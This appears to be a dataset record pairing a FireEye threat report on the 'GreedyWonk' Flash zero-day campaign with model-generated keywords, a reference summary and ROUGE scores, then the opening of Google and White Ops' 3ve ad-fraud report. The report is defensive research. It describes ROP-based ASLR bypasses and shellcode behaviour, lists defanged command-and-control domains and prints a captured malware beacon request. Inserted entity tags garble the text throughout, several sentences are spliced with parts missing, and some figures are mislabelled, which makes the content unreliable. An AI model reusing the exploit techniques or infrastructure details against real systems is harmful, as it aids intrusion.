Multiple Economic and Foreign Policy Sites Compromised , Serving Up Flash Zero - Day ExploitLess than [DATE] a [DATE] week after uncovering [PERSON] Operation [PERSON] SnowMan , [ORG] the [ORG] FireEye [ORG] Dynamic [ORG] Threat [ORG] Intelligence cloud has identified another targeted attack campaign \u2014 this one exploiting a zero - [DATE] day vulnerability in Flash . We are collaborating with [ORG] Adobe security on this issue . [ORG] Adobe has assigned the [ORG] CVE identifier CVE-2014- 0502 to this vulnerability and released a security bulletin . As of this blog post , visitors to [CARDINAL] at [CARDINAL] least [CARDINAL] three nonprofit institutions \u2014 [CARDINAL] two of which focus on matters of national security and public policy \u2014 were redirected to an exploit server hosting the zero - [DATE] day exploit . We \u2019re dubbing this attack \u201c [EVENT] Operation [EVENT] GreedyWonk . \u201dWe believe GreedyWonk may be related to a [DATE] May [DATE] 2012 campaign outlined by [ORG] ShadowServer , based on consistencies in tradecraft ( particularly with the websites chosen for this strategic Web compromise ) , attack infrastructure , and malware configuration properties . The group behind this campaign appears to have sufficient resources ( such as access to zero - [DATE] day exploits ) and a determination to infect visitors to foreign and public policy websites . The threat actors likely sought to infect users to these sites for follow - on data theft , including information related to defense and public policy matters . [ORG] DiscoveryOn [ORG] Feb. [ORG] 13 , [ORG] FireEye identified a zero - [DATE] day [PERSON] Adobe [PERSON] Flash exploit that affects the latest version of the Flash ( www.piie[.]com ) were redirected to an exploit server hosting this Flash zero - [DATE] day through a hidden iframe . We subsequently found that [ORG] the [ORG] American [ORG] Research [ORG] Center in [GPE] Egypt ( [ORG] www.arce[.]org ) and [ORG] the [ORG] Smith [ORG] Richardson [ORG] Foundation ( [ORG] www.srf[.]org ) also redirected visitors the exploit server . All [CARDINAL] three organizations are nonprofit institutions ; [ORG] the [ORG] Peterson [ORG] Institute and [ORG] Smith [ORG] Richardson [ORG] Foundation engage in national security and public policy issues . [ORG] MitigationTo bypass Windows \u2019 Address Space Layout Randomization ( ASLR ) protections , this exploit targets computers with any of the following configurations : Windows XP Windows 7 and Java 1.6Windows 7 and an out - of - date version of [ORG] Microsoft [ORG] Office [DATE] 2007 or 2010Users can mitigate the threat by upgrading from Windows XP and updating [ORG] Java [ORG] and [ORG] Office . If you have [PERSON] Java [PERSON] 1.6 , update [PERSON] Java to the latest [CARDINAL] 1.7 version . If you are using an out - of - date [ORG] Microsoft [ORG] Office [DATE] 2007 or [DATE] 2010 , update [ORG] Microsoft [ORG] Office to the latest version . These mitigations do not patch the underlying vulnerability . But by breaking the exploit \u2019s ASLR - bypass measures , they do prevent the current in - the - wild exploit from functioning . Vulnerability analysisGreedyWonk targets a previously unknown vulnerability in [PERSON] Adobe [PERSON] Flash . The vulnerability permits an attacker to overwrite the vftable pointer of a Flash object to redirect code execution . ASLR bypassThe attack uses only known ASLR bypasses . Details of these techniques are available from our previous blog post on the subject ( in the \u201c Non - ASLR modules \u201d section).For [PERSON] Windows [PERSON] XP , the attackers build a return - oriented programming ( [ORG] ROP ) chain of [ORG] MSVCRT ( Visual [ORG] C runtime ) gadgets with hard - coded base addresses for [LANGUAGE] English ( \u201c en \u201d ) and [NORP] Chinese ( \u201c zh - cn \u201d and \u201c zh - tw\u201d).On [EVENT] Windows [EVENT] 7 , the attackers use a hard - coded [ORG] ROP chain for MSVCR71.dll ( Visual C++ runtime ) if the user has [PERSON] Java [PERSON] 1.6 , and a hard - coded [ORG] ROP chain for [GPE] HXDS.dll ( [ORG] Help [ORG] Data [ORG] Services [PERSON] Module ) if the user has [ORG] Microsoft [ORG] Office [DATE] 2007 or [CARDINAL] 2010.Java [CARDINAL] 1.6 is no longer supported and does not receive security updates . In addition to the MSVCR71.dll ASLR bypass , a variety of widely exploited code - execution vulnerabilities exist in [PERSON] Java 1.6 . That \u2019s why [ORG] FireEye strongly recommends upgrading to [PERSON] Java [CARDINAL] 1.7.The [ORG] Microsoft [ORG] Office HXDS.dll ASLR bypass was patched at [DATE] the [DATE] end [DATE] of [DATE] 2013 . More details about this bypass are addressed by [ORG] Microsoft \u2019s Security [PERSON] Bulletin MS13 - 106 and an accompanying blog entry . [ORG] FireEye strongly recommends updating [ORG] Microsoft [ORG] Office [DATE] 2007 and [DATE] 2010 with the latest patches . [PERSON] Shellcode analysisThe shellcode is downloaded in [ORG] ActionScript as a [ORG] GIF image . Once [ORG] ROP marks the shellcode as executable using Windows \u2019 [ORG] VirtualProtect function , it downloads an executable via the InternetOpenURLA and InternetReadFile functions . Then it writes the file to disk with CreateFileA and [ORG] WriteFile functions . Finally , it runs the file using the [ORG] WinExec function . PlugX / [PERSON] Kaba payload analysisOnce the exploit succeeds , a PlugX / Kaba remote access tool ( RAT ) payload with the MD5 hash compiled on [DATE] Feb. 12 , [DATE] one [DATE] day before we [ORDINAL] first observed it , indicating that it was deployed specifically for this campaign . This PlugX payload was configured with the following command - and - control ( [WORK_OF_ART] CnC ) domains : java.ns1[.]name adservice.no - ip[.]org wmi.ns01[.]usSample callback traffic was as follows : POST /D28419029043311C6F8BF9F5 HTTP/1.1 User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 6.0 ; Windows NT [CARDINAL] 5.1 ; InfoPath.2 ; .NET CLR 2.0.50727 ; SV1 ) Host : java.ns1.name Content - Length : 0 Connection : Keep - Alive First Seen adservice.no - ip[.]org 2014 - 02 - 18 2014 - 02 - 18 java.ns1[.]name 2014 - 02 - 18 java.ns1[.]name 2014 - 02 - 17 wmi.ns01[.]us proxy.ddns[.]info 2013 - 05 - 02Last Seen 2014 - 02 - 19 2014 - 02 - 19 2014 - 02 - 18 2014 - 02 - 17 2014 - 02 - 18IP Address updatedns.ns01[.]us 2013 - 09 - 06 wmi.ns01[.]us 2013 - 07 - 042013 - 09 - 06 2013 - 09 - 06 2012 - 06 - 09 fuckchina.govnb[.]com 2010 - 03 - 15 microsafes.no - ip[.]org Domain fuckchina.govnb[.]com [DATE] 2013 - 12 - 11 microsafes.no - ip[.]org 2014 - 02 - 12 microsafes.no - ip[.]org [DATE] 2013 - 12 - 04Last Seen 2013 - 12 - 11 2014 - 02 - 12 2013 - 12 - 04IP Address configuration properties : MD5 password , which was dropped by an [PERSON] Adobe [PERSON] Flash exploit ( CVE-2012 - 0779 ) . In this previous incident , visitors to [ORG] the [ORG] Center [ORG] for [ORG] Defense [ORG] Information website ( www.cdi[.]org \u2014 also an organization involved in to using the same password \u201c java7 , \u201d this variant was configured with the mutex with the similar pattern of \u201c YFds*&^ff \u201d and connected to a [WORK_OF_ART] CnC server at windows.ddns[.]us . Using passive [ORG] DNS analysis , we see the domains windows.ddns[.]us and wmi.ns01[.]us both resolved to wmi.ns01.us windows.ddns.usFirst Seen 2012 - 07 - 07 2012 - 05 - 23Last Seen 2012 - 09 - 19 2012 - 06 - 10IP Address variant connected to a [WORK_OF_ART] CnC server at ids.ns01[.]us . The domain ids.ns01[.]us also overlaps with the wmi.ns01[.]us ids.ns01[.]usFirst Seen 2012 - 07 - 03 2012 - 04 - 23Last Seen [DATE] 2012 - 07 - 04 2012 - 05 - 18IP Address an exploit chain that began with a redirect from [ORG] the [ORG] Center [ORG] for [ORG] European [ORG] Policy [ORG] Studies ( www.ceps[.]be ) . In this case , visitors were redirected from www.ceps[.]be to a [PERSON] Java exploit hosted on shop.fujifilm[.]be . In what is certainly not a coincidence , we also observed [ORG] www.arce[.]org ( one of the sites redirecting to the current [PERSON] Flash exploit ) also redirect visitors to the [PERSON] Java exploit on shop.fujifilm[.]be in [CARDINAL] 2013.ConclusionThis threat actor clearly seeks out and compromises websites of organizations related to international security policy , defense topics , and other non - profit sociocultural issues . The actor either maintains persistence on these sites for extended periods of time or is able to re - compromise them periodically . This actor also has early access to a number of zero - [DATE] day exploits , including [PERSON] Flash and [PERSON] Java , and deploys a variety of malware families on compromised systems . Based on these and other observations , we conclude that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid- term .", "generated_text": "Operation GreedyWonk; Adobe Flash; CVE-2014-0502; visitors; a zero-day exploit; Windows; the attackers; overwrite; the vftable pointer; a Flash object; code execution; ASLR bypass; Windows 7; an out-of-date version; Microsoft Office; the latest version; mitigations; the victim; the exploit; infections; the exploit; the attackers; the Flash; the vulnerability; the attackers; legitimate websites; defense; public policy; data theft; data theft; insight; local governments.", "ref_text": "<START-1>The document describes an attack campaign dubbed \"Operation GreedyWonk\" that was discovered in February 2014. The campaign involved compromising multiple websites related to economic policy, foreign affairs, and national security. Visitors to these compromised sites were redirected to an exploit server hosting a zero-day Flash exploit (CVE-2014-0502). The goal was to infect visitors, especially those interested in defense and public policy matters, with malware for follow-on data theft. The exploit bypassed Windows ASLR protections by targeting systems still running Windows XP or having outdated Java and Microsoft Office. Once the exploit succeeded, it installed a remote access trojan called PlugX/Kaba. This malware variant was compiled shortly before discovery, indicating it was specifically built for this campaign. Researchers believe GreedyWonk may be connected to an earlier 2012 campaign that used similar tradecraft and infrastructure. Malware samples from both campaigns connected to overlapping domains that previously resolved to the same IP addresses. The group behind the campaigns appears sufficiently resourced to access zero-days and remains a credible threat. The report highlights the actor's persistence in compromising policy and defense-related websites, early access to exploits, ability to re-compromise sites, and deployment of various malware families. This demonstrates an adversary with mature capabilities that continues to pose a threat through strategic web compromises to infect visitors from specific communities. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4502617801047121, "gpt3/lexical/rouge_rouge2": 0.15789473684210525, "gpt3/lexical/rouge_rougeL": 0.25130890052356025, "gpt3/lexical/rouge_rougeLsum": 0.25130890052356025, "gpt3_generated_text": ["Operation GreedyWonk is a targeted attack campaign that exploits a zero-day vulnerability in Adobe Flash. The attackers redirected visitors to at least three nonprofit institutions, two of which focus on national security and public policy, to an exploit server hosting the zero-day exploit. The group behind this campaign appears to have access to zero-day exploits and aims to infect users of foreign and public policy websites for data theft. The exploit targets computers with specific configurations and bypasses Windows' Address Space Layout Randomization (ASLR) protections. Mitigations include upgrading from Windows XP, updating Java and Microsoft Office, and breaking the exploit's ASLR-bypass measures. The vulnerability allows the attacker to overwrite the vftable pointer of a Flash object to redirect code execution. The exploit uses known ASLR bypasses and downloads shellcode as a GIF image. The shellcode marks itself as executable using Windows' VirtualProtect function and downloads an executable file via InternetOpenURLA and InternetReadFile functions."]}, {"split_name": "val", "sample_id": "val_79", "prompt_text": "Extract the keywords: The Hunt for 3veTaking down a major ad fraud operation through industry collaborationNovember [CARDINAL] 2018Co - authored by Google and White Opswith technical contributions by [GPE] Proofpoint and others1Table of [ORG] ContentsForeword [ORG] Page [ORG] 03 Acknowledgements Page 04 Context and background Page [CARDINAL] 05 A novel and innovative ad fraud threat Page [CARDINAL] 05 [CARDINAL] 3ve in a nutshell [DATE] Page [DATE] 06 [DATE] Operation summary Page 06 [PRODUCT] Discovery and history Page 07 A low - level botnet quickly evolves Page 07 Our knowledge and collaboration expanded Page 07 The [ORDINAL] 3ve operation Page 08 3ve.1 Page 11 3ve.2 Page 12 3ve.3 Page 13 Taking 3ve down Page [CARDINAL] 14 The industry working group [ORG] Page [ORG] 14 [ORG] Indication of a successful takedown Page [CARDINAL] 14 Uniting the industry against future attacks Page [CARDINAL] 15 Appendix Page 17 3ve.1 Page [CARDINAL] 17 Operating as a proxy in user \u2019s PCs Page 17 Network communication [DATE] Page [DATE] 19 3ve.1 [CARDINAL] C2 handshake Page [CARDINAL] 20 [ORG] BGP hijacking Page [DATE] 21 [DATE] 3ve.2 [DATE] Page [DATE] 23 Counterfeit websites [PERSON] Page [CARDINAL] 23 Hidden Windows Page 27 Fake Browsing Behavior Page [CARDINAL] 27 Mouse movements Page [CARDINAL] 27 Patching functions Page [CARDINAL] 28 Playing media Page 29 Tag evasion Page [CARDINAL] 30 Non - counterfeit domains browsing Page 30 C2 Instructions Page [CARDINAL] 30 Parameters explained Page 33 Geographic distribution Page [CARDINAL] 34 Infected IPs and churn rate Page 35 3ve.3 [ORG] Page [ORG] 352Foreword ForewordEvery year brings new levels of sophistication and innovation in cybercrime , and [DATE] the [DATE] last [DATE] year was no exception . Over the course of [DATE] last [DATE] year , we investigated [CARDINAL] one of the most complex and sophisticated ad fraud operations we have seen to date . We named this operation \u201c 3ve \u201d ( pronounced \u201c Eve \u201d ) , and we \u2019re sharing what we \u2019ve learned from our investigation into its activity with the broader community to promote collaboration in the ongoing fight against cybercrime . These efforts demonstrate how effective cooperation and collaboration across the digital advertising industry can be in curbing ad fraud.3ve operated on a massive scale : at its peak , it controlled over [CARDINAL] 1 [CARDINAL] million IPs from both residential botnet infections and corporate [ORG] IP spaces , primarily in [LOC] North [LOC] America and [LOC] Europe ( for comparison , this is more than the number of broadband subscriptions in [GPE] Ireland ) . It featured several unique sub - operations , each of which constituted a sophisticated ad fraud scheme in its own right . Shortly after we began to identify the massive infrastructure ( comprised of [CARDINAL] thousands of servers across many data centers ) used to host [CARDINAL] 3ve \u2019s operation , we found similar activity happening within a network of malware - infected residential computers . These diversified tactics and siloed operations made [CARDINAL] 3ve \u2019s operators harder to identify than previous operations we \u2019d encountered , and also allowed the larger fraud enterprise to continue when [CARDINAL] one aspect of it was disrupted . Through its varied and complex machinery , [CARDINAL] 3ve generated [CARDINAL] billions of fraudulent ad bid requests ( i.e. , ad spaces on web pages that advertisers can bid to purchase in an automated way).3ve \u2019s size and tactics are considerable for an ad fraud operation , but the fact that fraudsters dedicate their time and effort to developing complex ad fraud schemes is hardly a surprise . Ad fraud has been an attractive cybercrime due to its lucrative returns and relatively low risk . The primary risk for most fraudsters has been having their operation discovered and shut down . While that can cost fraudsters [CARDINAL] thousands \u2013 and sometimes [CARDINAL] millions \u2013 of dollars in illicit profits , the prospect of purely financial losses has not effectively deterred fraudsters from simply starting another operation . [DATE] Today marks the culmination of a collaborative effort that enabled us to more thoroughly confront and dismantle 3ve . We referred our findings to law enforcement , and [DATE] today [ORG] the [ORG] U.S. [ORG] Department [ORG] of [ORG] Justice announced criminal charges tied to [CARDINAL] 3ve \u2019s operations . What followed was a collaborative and coordinated effort by both law enforcement and various companies across industries , including ad tech , cyber security , and Internet service providers , to disable the infrastructure and sinkhole botnet command and control servers . The result so far has rendered the operation \u2019s botnets unable to continue to drive fraudulent ad traffic . Protecting the many targets \u2013 including our customers \u2013 of an operation like [ORDINAL] 3ve in the context of a multi - stakeholder working group required patience , dedication , diligence , and endurance . Our core objectives were to detect and prevent this fraud on behalf of our customers and Internet users , and to cut this operation off from its sources of profit . While ad fraud continues to represent a challenge to the advertising industry , the action taken [DATE] today demonstrates that it is a risky activity with potentially serious consequences for fraudsters . And our efforts wo n\u2019t stop here \u2014 we \u2019re confident that the industry - wide movement to protect the integrity of the digital advertising economy will continue on . Tamer [PERSON] Hassan Co [PERSON] - Founder [PERSON] & [PERSON] CTO , [ORG] White [ORG] OpsPer [ORG] Bjorke [ORG] Senior Product Manager , Google3AcknowledgementsThis research was conducted by a team of dedicated security professionals . We would like to thank [PERSON] Kafeine from [ORG] ProofPoint and the teams at ESET and [GPE] Malwarebytes , as well as [PERSON] Matt [PERSON] Carothers , [PRODUCT] F [PRODUCT] - Secure , Symantec , and [ORG] Trend [ORG] Micro for their collaboration , contributions , and camaraderie in this effort . We would also like to thank all of the participants in the industry working group : [ORG] Adobe , [ORG] Amazon [ORG] Advertising , CenturyLink , ESET , Facebook , Fox - IT , [PRODUCT] F [PRODUCT] - Secure , [PERSON] Matt [PERSON] Carothers , [ORG] McAfee , [ORG] Microsoft [ORG] Digital [ORG] Crimes [ORG] Unit , Oath , Symantec , [ORG] The [ORG] Shadowserver [ORG] Foundation , The Trade Desk , [ORG] Trend [ORG] Micro , and others . Last but not least , we would like to acknowledge and thank the broader members of our respective teams at Google and White Ops , as their work was critical every step along the way . Please note that we \u2019ve aimed to strike a balance in this document in terms of sharing technical information that has utility and excluding additional information that is too sensitive to share publicly . We encourage ad fraud researchers and other information security professionals to contact us at threatintel@whiteops.com for additional information that we may be able to disclose on a case - by - case basis.4Context and backgroundThe world of data science and cybersecurity is nothing like detective work in the movies . Usually , fraudulent activity is identified , traced to its source , and then cut off \u2014 and that \u2019s where the vast majority of cases end . Rarely does corporate ad fraud prevention lead to criminal charges , but that is exactly what happened with [CARDINAL] 3ve.are being seen by actual , interested users . These fraudsters attempt to extract small amounts of money from multiple parties and transactions with the goal of making the losses appear unconnected \u2014 if they \u2019re successful , in aggregate , these extracted amounts can add up to considerable profits for the fraudsters.3ve [ORDINAL] first emerged as a small bot - driven effort that subsequently grew into a large and sophisticated operation . As we investigated and battled against it , we began to better understand the operation and its aggressive evolution \u2014 and realized there were several operations with some common characteristics . Through our fight , we found ourselves on a path of discovery , exploration , and what some might describe as adventure . Because operations like [ORDINAL] 3ve bring distrust and instability to the digital advertising ecosystem , we were as thorough as possible in our efforts to bring it down . In the twists and turns that followed , we learned valuable lessons about the tactics and approaches fraudsters try to use to escape the notice of both their victims and those trying to uncover their operations , and the signals that will tip us off to similar operations in the future . [DATE] Today , digital advertising is primarily bought and sold through \u201c programmatic \u201d platforms . Publishers agree to feature ads alongside their content and use [ORG] Supply [ORG] Side [ORG] Platforms ( SSPs ) to auction their available ad space , or inventory , to advertisers . Advertisers use Demand Side Platforms ( DSPs ) to bid on that available ad space based on how successful they think those ads will be in generating the interest of visitors . These auctions happen [CARDINAL] billions of times a day , in the milliseconds before a page loads on your browser , and inventory can be passed between many auctions before being matched with an advertiser who wants to place their ad on your screen . The ability to sell and purchase digital advertising inventory programmatically has enabled publishers to maximize revenues and advertisers to realize a greater return on investment . Subsequently , programmatic advertising has rapidly evolved and grown into a multi - billion dollar industry , increasingly gaining prominence and visibility across the digital advertising ecosystem . Unfortunately , this increased prominence has also attracted the attention of tech - savvy fraudsters , who try to produce fake traffic and fraudulent ad inventory to trick advertisers into believing that their [ORDINAL] adsA novel and innovative ad fraud [PERSON] threat3ve was typical of many ad fraud operations in that it generated revenue by selling forgeries of [CARDINAL] two major assets in high demand from advertisers : human audiences and premium publisher inventory . But because [ORDINAL] 3ve was uniquely effective at counterfeiting the domains of prestigious publishers and sending droves of bots to false inventory , it was able to generate a substantial volume of fake ad bid requests . [ORDINAL] 3ve also operated at a high level of sophistication that appeared to be a series of unrelated operations . Its operators constantly adopted new ways to disguise 3ve \u2019s bots , allowing the operation to continue growing even after their traffic was blacklisted . Whenever they were blocked off in [CARDINAL] one place , they \u2019d reappear somewhere else.3ve was typical of many ad fraud operations in that it generated revenue by selling forgeries of [CARDINAL] two major assets in high demand from advertisers : human audiences and premium publisher inventory.5To protect itself against ad fraud , the industry relies on [ORDINAL] third party verification solutions like [ORG] White [ORG] Ops and in - house defenses like those implemented by Google . Collectively , our teams have seen a wide range of botnet schemes , ad fraud tactics , and invalid activity . This knowledge and expertise helped us perform a deeper investigation into [ORDINAL] 3ve , connect all of its disparate sub - operations and components to a larger infrastructure , and reveal how sophisticated and well - organized these operation were.3ve in a nutshellOperation summary3b+1m700kDaily bid requestsCompromised IPsActive infections at a time60k+10k+1k+Accounts selling ad inventoryWebsites counterfeitedData center nodesPeak metrics , including ad traffic volumes and other volumes observed over the course of [CARDINAL] 3ve \u2019s investigation . Advanced techniques used to avoid detectionMimicking human behaviors including mouse movements , faked clicks , etc . Tag evasionAbility to quickly regenerate residential [ORG] IP addressesMalware anti - forensicsNo single point of failure ( e.g. , fixed [ORG] IP list)3ve used a variety of techniques that made it more difficult to identify and analyze.6Discovery and historyA low - level botnet quickly evolvesWe [ORDINAL] first noticed the beginnings of what would later become 3ve while our [CARDINAL] two companies were assessing the impact of the Methbot operation , a similar underground ad fraud enterprise that [ORG] White [ORG] Ops revealed in [DATE] 2016 . At this early stage of [CARDINAL] 3ve \u2019s growth , it appeared to be a low - volume bot operation conducting ad fraud through residential computers infected with an unknown malware . Far from being groundbreaking , it looked like a run - of - the - mill malicious bot with minimal impact on the industry at large . We estimate that [ORDINAL] 3ve generated [MONEY] between [MONEY] 3 [MONEY] billion [MONEY] and [MONEY] 12 [MONEY] billion or more [DATE] daily ad bid requests at its peak . But [CARDINAL] 3ve \u2019s activity grew in [DATE] 2017 , with its operation eventually generating [CARDINAL] billions of [DATE] daily ad bid requests . That spike in activity prompted our [CARDINAL] two companies to begin collaborating in investigating the malware being used by this newly prominent fraud enterprise . We estimate that [ORDINAL] 3ve generated [MONEY] between [MONEY] 3 [MONEY] billion [MONEY] and [MONEY] 12 [MONEY] billion or more [DATE] daily ad bid requests at its peak . The lower bound ( [CARDINAL] 3 [CARDINAL] billion ) is a conservative estimate based on how many ad bid requests a single buying platform may have received . This approach may underestimate the total volume of ad bid requests generated by [ORDINAL] 3ve , because each individual buying platform may not have received all ad bid requests ( e.g. [CARDINAL] one [ORG] DSP may not have had a business relationship with all available supply partners or a [ORG] DSP may only have received portions of available inventory from some supply partners ) . When measuring [CARDINAL] 3ve \u2019s ad bid volume across the supply chain ( and not only within a single buying platform ) we estimate that the ad bid volume exceeded [CARDINAL] 12 [CARDINAL] billion [DATE] daily ad bid requests . It should be noted that our analysis of ad bid requests indicated growth in activity , but not necessarily growth in transactions that would result in charges to advertisers . It is also worthnoting that [MONEY] 3 [MONEY] - [MONEY] 12 [MONEY] billion is a small percentage of overall bid request volume across the industryOur knowledge and collaboration expandedAlthough we were able to identify the traffic from the operation , our visibility into its full capabilities was limited until we discovered malware samples that matched what we \u2019d seen from 3ve \u2019s bots . This led us to [CARDINAL] two malware families : [ORG] Boaxxe / [ORG] Miuref and [PERSON] Kovter . We started referring to the bot operation as 3ve because our analysis suggested that it was composed of [CARDINAL] three distinct sub - operations , all of which shared certain similarities , but which were specifically designed to commit different kinds of ad fraud . We gathered malware samples from fellow fraud researchers at [GPE] Proofpoint and [GPE] Malwarebytes , but each time we tried to run them on our own computers , they would n\u2019t work . After some deep collaboration with [ORG] ProofPoint and [GPE] Malwarebytes , we discovered that this was because the malware was using anti - forensics , an evasion tactic in which malware scans a computer \u2019s processes , hardware , username , and [ORG] IP address for any security software that might detect it before running on that computer . The malware was also only receiving and executing ad fraud instructions on computers with certain ISPs and in specific geographical locations . Subsequently , we were able to observe and gradually understand [CARDINAL] 3ve \u2019s inner workings . That process progressively revealed the presence of more malware and botnet families being used by 3ve . We started referring to the bot operation as 3ve because our analysis suggested that it was composed of [CARDINAL] three distinct sub - operations , all of which shared certain similarities , but were specifically designed to commit different kinds of ad fraud . We observed the network using tactics like7tag manipulation and suppression to cover its tracks , and noticed that it had started to quickly change its codebase after each spike in its activity . We had to ensure that the operators thought they were going unnoticed in order to observe them and apply our learnings to future security efforts.acquire new [ORG] IP addresses , we realized that a blacklist would only temporarily interrupt [CARDINAL] 3ve \u2019s activity . To take it down permanently , we needed to understand how [ORDINAL] 3ve was structured and organized , we had to ensure that the operators thought they were going unnoticed in order to observe them and apply our learnings to future security efforts , and we needed to expand our effort beyond Google and White Ops . The actors responsible for the [CARDINAL] three sub - operations of [CARDINAL] 3ve demonstrated a high level of sophistication , creativity , and agility . In response , we needed to figure out a way to permanently disable it or shut it down . [CARDINAL] One way to bring down bot operations is to blacklist all of their known [ORG] IP addresses . However , because of the operation \u2019s aggressiveness , as well as its ability to rapidlyAs [CARDINAL] 3ve \u2019s perpetrators were building the infrastructure behind their operations , we secretly started building a coalition of partners working to stop them . Over [DATE] the [DATE] following [DATE] weeks [DATE] and [DATE] months , [ORG] White [ORG] Ops , [ORG] Google , and various other industry participants together to dismantle [DATE] 3ve . The [ORDINAL] 3ve operationA typical ad fraud operation tries to keep its profit model simple , targeting [CARDINAL] only [CARDINAL] one aspect of the digital advertising ecosystem . For example , fraudsters will commonly create and sell bot traffic to unsuspecting publishers looking to get more eyes on their content . [CARDINAL] At [CARDINAL] least [CARDINAL] two of the three 3ve sub - operations used such tactics and also added another common approach : selling counterfeit ad inventory featuring the domains of popular websites \u201c spoofed \u201d by [CARDINAL] 3ve \u2019s operators . Domain spoofing is designed to fool advertisers into thinking that an impression of their ad was served on a premium publisher site , like that of a noteworthy newspaper ( and not on an empty website designed for bot traffic).Closed Captioning American Sis - Sibling Rivalry - FilmPhile\u2022 Watch More Funny Movies on [ORG] FilmPhile [ORG] \u2022 [ORG] Watch [ORG] Live [ORG] TV on FilmPhile \u2022 Watch This Season \u2019s Comedy on FilmPhile \u2022 Here \u2019s What Happened on American Sis - The Secret Society of Super Sisters - FilmPhile \u2022 HelpTurned - All Is Not Gone - FIlmPhile CD [ORG] League [ORG] - Semifinals / Grand [ORG] Final [ORG] - FilmPhile SearchAn example counterfeit site shows a low - quality web page with a video ad and links below.8But this describes only the basic premise behind what is actually a set of [CARDINAL] three distinct sub - operations , each taking unique measures to avoid detection , and each built around different architectures using different components . Like a fully professional software company , [CARDINAL] 3ve \u2019s operators had the ability to A / B test different approaches , as well as different parts of the bot operation , in order to insulate themselves from the fallout if one part was somehow cut off or shut down . Although the degree of complexity varied among the [CARDINAL] three sub - operations , all [CARDINAL] three demonstrated highly advanced behaviors , including the impersonation of real human users , tag evasion , and sophisticated malware - based anti - forensics . Overall 3ve operations3ve.13ve.23ve.3General [ORG] DescriptionData center based bot with botnet and hijacked IPsBotnet based counterfeit ad fraudData center botMostly counterfeit with fake pages and apps hosted in data centers . Indication of some traffic selling . Mostly counterfeit inventory with fake pages hosted in data centers . Indication of some traffic selling . Indications of traffic selling , and unable to determine if they also create counterfeit inventory . The residential IPs of botnet infected computers or from [ORG] BGP hijacked IPsThe residential IPs of botnet infected computersData center IPsMonetizationApproachAd Request IP Address9When combined , the [CARDINAL] three [CARDINAL] 3ve sub - operations constituted [CARDINAL] one of the most widespread ad fraud operations ever uncovered . [CARDINAL] One of the [CARDINAL] three sub - operations included [CARDINAL] one of the larger active botnets , with up to [CARDINAL] 700,000 active desktop infections at any given time . [CARDINAL] One of the other 3ve sub - operations was by itself similar in size and scope to the Methbot operation of [DATE] 2016 , which was likely the largest known ad fraud operation at that time . All told , [ORDINAL] 3ve controlled over [CARDINAL] 1 [CARDINAL] million IPs from both residential botnet infections and corporate [ORG] IP spaces ( as noted above , there were up to [CARDINAL] 700,000 active infections at any given time ) . In aggregate , the operation also produced [CARDINAL] more [CARDINAL] than [CARDINAL] 10,000 counterfeit domains , and generated over 3 billion daily bid requests at its peak . We estimate that portions of the bot operation spanned over [CARDINAL] 1,000 servers in data centers allocated to various functions needed for this type of large - scale operation . Despite [CARDINAL] 3ve \u2019s scale and aggressive growth , we worked proactively to deploy countermeasures in order to protect customers and to diminish the chances that 3ve \u2019s operators could benefit from their activities . Our collective experience in combating ad fraud enabled us to establish a variety of defenses against [ORDINAL] 3ve , while we worked in parallel to dismantle it . The sections below provide a brief overview of all [CARDINAL] three 3ve operations ( called 3ve.1 , 3ve.2 , and [CARDINAL] 3ve.3 for the sake of clarity ) , breaking down how each was structured to circumvent bot detection and blocking measures in order to siphon as much ad budget as possible . Expanded details and context for the sub - operations are included in the [NORP] Appendix . Real Human TrafficProgammatic Supply ChainAd Networks Sell ad space [ORG] toDemand [ORG] Side [ORG] Platforms and directly to advertisers . [ORG] AdvertisersWin auctions to deliverads on webpages.01 [DATE] 01 [DATE] 01Everyday PeopleCreate real ad space by visiting real web pages . Fake or Non [ORG] - Human [ORG] Traffic1,000+Ad [ORG] Fraud [ORG] Operator [ORG] Uploads instructionsto [ORDINAL] 3ve botnets.3ve BotnetsOpen thousands of webbrowsers , disguise traffic , and visit fake and real web pages . Real and fake web pagescreate ad space thatis sold in programmaticsupply chain . Supply Side PlatformsSell ad space [ORG] toDemand Side [GPE] Platformsin real time . Demand Side Platforms Submit bids on behalfof advertisers to purchase ad space . An overview of the broader [ORDINAL] 3ve operation103ve.1The [ORDINAL] first of [CARDINAL] 3ve \u2019s [CARDINAL] three ad fraud sub - operations , 3ve.1 , was powered by a network of bots all operating in a few data centers across the [GPE] US and [LOC] Europe . Normally , bot operations like these are very easy to detect \u2014 if you see a lot of traffic for an ad coming from the same [ORG] IP address , you know you \u2019re dealing with a bot farm . But this operation cleverly used compromised [ORG] IP addresses as a proxy , making it seem as though its ad requests were coming from computers in homes and businesses in sought - after markets . While many of these [ORG] IP addresses were acquired via a malware called [ORG] Miuref [ORG] or [ORG] Boaxxe , others were obtained using a procedure called Border Gateway Protocol ( [ORG] BGP ) hijacking . The hackers essentially seized huge swaths of corporate and residential IP space by interfering directly with the main Internet routing protocol . All the fake ad requests from 3ve.1 initially pretended to be from desktop browsers , but this changed over time , with the operation increasingly relying on spoofed mobile traffic . This was done by the data center - based browsers pretending to be [ORG] Android devices . There were two unique , active mobile misrepresentation schemes : in [CARDINAL] one the ad requests were spoofed to look like they came from mobile apps , in the other the ad requests were spoofed to look like they came from mobile browsers . The spoofing was achieved by overriding the parameters typically used to determine what type of device the traffic came from.1,000+Ad fraud operator writes instructions and uploads it to their data center botnet . The data center computersopen [CARDINAL] thousands of web browsers and contact acommand and control relay . The command and control relays direct the data center browsersto proxy their traffic throughinfected devices or hijacked IPs and visit fake and real web pages . Those fake web pages generate ad requests to receive ads from the programmatic supply chain.3ve.1 architecture113ve.2Comparable to [CARDINAL] 3ve.1 , 3ve.2 also used counterfeit domains to sell fake ad inventory to advertisers . But instead of relying on proxies to hide its activities , 3ve.2 used a custom - built browsing engine installed with the [PERSON] Kovter botnet , which had infected [CARDINAL] hundreds [CARDINAL] of [CARDINAL] thousands of computers through malvertising campaigns ( malvertising is the use of digital ads to distribute malware ) . This operation had similarities with 3ve.1 ( although 3ve.2 was superior in its level of sophistication ) that initially led us to believe they might be variants of each other , but later research suggested they were distinct , but connected sub - operations . Recent evaluations of the [PERSON] Kovter botnet have put it at [CARDINAL] approximately [CARDINAL] 700,000 user computers and [ORG] IP addresses . 3ve.2 made use of redirection servers that instructed the infected computers to visit specific fake web pages . [PERSON] Fraud [PERSON] Operator sends instructions to commandand control server . Kovter infected computersreceive instructions 